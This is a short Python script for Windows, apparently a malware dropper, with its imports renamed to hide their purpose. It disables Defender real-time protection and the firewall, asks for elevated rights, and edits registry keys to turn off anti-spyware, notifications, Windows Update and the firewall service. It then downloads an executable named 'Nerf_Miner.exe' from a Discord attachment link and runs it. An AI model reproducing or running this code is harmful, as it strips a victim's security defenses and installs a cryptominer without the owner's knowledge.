from os import name as namer
from sys import executable as syex
from ctypes import windll as yasuo
from sys import argv as arvsy
from winreg import HKEY_LOCAL_MACHINE as hklmch
from winreg import OpenKey as OPKY
from winreg import REG_DWORD as RDWRD
from winreg import SetValueEx as SVEX
from winreg import HKEY_CURRENT_USER as userkey
from winreg import CreateKeyEx as myexcreate
from winreg import KEY_ALL_ACCESS as KAAC
from time import sleep as sleepy
from subprocess import call as subcal
from os import chdir as cehape
from os import getenv as getent
from os import path as pata
from os import remove as remoda
from os import startfile as starta
from requests import get as getto

if namer == 'nt':
    subcal("powershell Set-MpPreference -DisableRealtimeMonitoring $true", shell=True)
    subcal("netsh firewall set opmode disable", shell=True)
    sleepy(1)


    def is_admin():
        try:
            return yasuo.shell32.IsUserAnAdmin()
        except:
            return False


    if is_admin():
        aKey = OPKY(hklmch, "SOFTWARE\Policies\Microsoft\Windows Defender", 0,
                    KAAC)
        bKey = OPKY(userkey, "SOFTWARE\Policies\Microsoft\Windows", 0, KAAC)
        myexcreate(bKey, "Explorer", 0, KAAC)
        SonOf = OPKY(userkey, "SOFTWARE\Policies\Microsoft\Windows\Explorer", 0, KAAC)
        cKey = OPKY(hklmch, "SYSTEM\CurrentControlSet\Services\mpssvc", 0, KAAC)
        sleepy(1)
        SVEX(SonOf, "DisableNotificationCenter", 0, RDWRD, 1)
        SVEX(aKey, "DisableAntiSpyware", 0, RDWRD, 1)
        SVEX(SonOf, "NoWindowsUpdate", 0, RDWRD, 1)
        SVEX(cKey, "Start", 0, RDWRD, 4)
        cehape(getent('APPDATA'))
        nerfertest = pata.isfile("nerfer.exe")
        if nerfertest == True:
            remoda("nerfer.exe")
        else:
            sleepy(1)


            def download_file(url, filename=''):
                try:
                    if filename:
                        pass
                    else:
                        filename = req.url[downloadUrl.rfind('/') + 1:]

                    with getto(url) as req:
                        with open(filename, 'wb') as f:
                            for chunk in req.iter_content(chunk_size=8192):
                                if chunk:
                                    f.write(chunk)
                        return filename
                except Exception as e:
                    print(e)
                    return None


            downloadLink = 'https://cdn.discordapp.com/attachments/727854894291091458/948902534788022282/Nerf_Miner.exe'

            download_file(downloadLink, 'nerfer.exe')
            sleepy(1)
            starta('nerfer.exe')
    else:
        # Re-run the program with admin rights
        yasuo.shell32.ShellExecuteW(None, "runas", syex, " ".join(arvsy), None, 1)

else:
    yasuo.user32.MessageBoxW(0, "This program written for only Windows OS system.Can't work on your OS", "Error : Wrong OS", 1)
